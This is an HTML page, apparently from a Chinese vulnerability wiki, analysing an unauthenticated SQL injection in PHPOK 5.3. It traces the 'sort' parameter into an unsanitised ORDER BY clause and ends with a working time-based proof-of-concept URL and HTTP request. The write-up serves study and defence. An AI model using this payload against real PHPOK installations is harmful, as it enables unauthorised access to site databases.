@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PHPOK 5.3 前台无限制注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PHPOK 5.3 \u524d\u53f0\u65e0\u9650\u5236\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PHPMailer/CVE-2017-5223/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PHPMailer/CVE-2017-5223/README.zh-cn/" class="btn btn-xs btn-link">
+        PHPMailer 任意文件读取漏洞（CVE-2017-5223）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpok-53">PHPOK 5.3 前台无限制注入<a class="headerlink" href="#phpok-53" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>PHPOK 5.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>注入点：framework/model/list.php#arc_all</p>
+<div class="codehilite"><pre><span></span><code>public function arc_all($project,$condition=&#39;&#39;,$field=&#39;*&#39;,$offset=0,$psize=0,$orderby=&#39;&#39;)
+    {
+        if($this-&gt;_total &gt; 100000 &amp;&amp; $offset &gt; 10000){
+            return $this-&gt;_arc_all($project,$condition,$field,$offset,$psize,$orderby);
+        }
+        $sql  = &quot; SELECT &quot;.$field.&quot; FROM &quot;.$this-&gt;db-&gt;prefix.&quot;list l &quot;;
+        $sql .= &quot; JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_&quot;.$project[&#39;module&#39;].&quot; ext &quot;;
+        $sql .= &quot; ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) &quot;;
+        if($project[&#39;is_biz&#39;]){
+            $sql .= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_biz b ON(b.id=l.id) &quot;;
+        }
+        if($project[&#39;cate&#39;] &amp;&amp; $project[&#39;cate_multiple&#39;]){
+            $sql.= &quot; LEFT JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_cate lc ON(l.id=lc.id) &quot;;
+        }
+        if($condition){
+            $sql .= &quot; WHERE &quot;.$condition.&quot; &quot;;
+        }
+        // 拼接$orderby参数
+        if($orderby){
+            $sql .= &quot; ORDER BY &quot;.$orderby.&quot; &quot;;
+        }
+        if($psize){
+            $sql .= &quot; LIMIT &quot;.intval($offset).&quot;,&quot;.$psize;
+        }
+        //注入
+        $rslist = $this-&gt;db-&gt;get_all($sql,&#39;id&#39;);
+        if(!$rslist){
+            return false;
+        }
+        return $this-&gt;_arc_list_format($rslist,$project);
+    }
+回溯寻找调用链：framework/phpok_call.php#_arclist
+
+private function _arclist($rs,$cache_id=&#39;&#39;)
+{
+    // 264行
+    $orderby = $rs[&#39;orderby&#39;] ? $rs[&#39;orderby&#39;] : $project[&#39;orderby&#39;];
+
+    // 270行 调用arc_all函数，将$orderby传入
+    $rslist = $this-&gt;model(&#39;list&#39;)-&gt;arc_all($project,$condition,$field,$offset,$psize,$orderby);
+</code></pre></div>
+
+<p>回溯：framework/api/project_control.php#load_module</p>
+<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">load_module</span><span class="p">(</span><span class="o">$</span><span class="n">rs</span><span class="p">,</span><span class="o">$</span><span class="n">parent_rs</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">91</span><span class="err">行</span>
+<span class="w">    </span><span class="o">$</span><span class="n">keywords</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;keywords&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">ext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;ext&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">tag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;tag&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;uid&#39;</span><span class="p">,</span><span class="s1">&#39;int&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;attr&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">//</span><span class="err">价格，支持价格区间</span>
+<span class="w">    </span><span class="o">$</span><span class="n">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">,</span><span class="s1">&#39;float&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">sort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="mi">186</span><span class="err">行</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">sort</span><span class="p">){</span>
+<span class="w">        </span><span class="o">$</span><span class="n">dt</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">sort</span><span class="p">;</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="err">可控</span>
+<span class="w">        </span><span class="o">$</span><span class="n">pageurl</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&amp;sort=&#39;</span><span class="o">.</span><span class="n">rawurlencode</span><span class="p">(</span><span class="o">$</span><span class="n">sort</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">rlist</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">sort</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">208</span><span class="err">行，通过</span><span class="n">phpok函数动态调用_arclist</span><span class="p">()</span><span class="err">函数</span>
+<span class="w">        </span><span class="o">$</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">call</span><span class="o">-&gt;</span><span class="n">phpok</span><span class="p">(</span><span class="s1">&#39;_arclist&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">dt</span><span class="p">);</span>
+</code></pre></div>
+
+<p>继续回溯，找谁调用了load_module()：framework/api/project_control.php#index_f</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">index_f</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="o">//</span><span class="mi">65</span><span class="err">行</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">project</span><span class="p">[</span><span class="s2">&quot;module&quot;</span><span class="p">]){</span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">load_module</span><span class="p">(</span><span class="o">$</span><span class="n">project</span><span class="p">,</span><span class="o">$</span><span class="n">parent_rs</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>在控制器里以_f结尾的函数都可以直接被调用</p>
+<p>构造poc:</p>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5))
+</code></pre></div>
+
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>poc</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5))</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">phpok5_3_147</span>
+<span class="na">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.131 Safari/537.36</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSION=l87bngd1u307g20iudfmphisu4; XDEBUG_SESSION=PHPSTORM</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+
+<h2 id="_6">四、参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/6831">https://xz.aliyun.com/t/6831</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PHPMailer/CVE-2017-5223/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PHPMailer/CVE-2017-5223/README.zh-cn/" class="btn btn-xs btn-link">
+        PHPMailer 任意文件读取漏洞（CVE-2017-5223）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
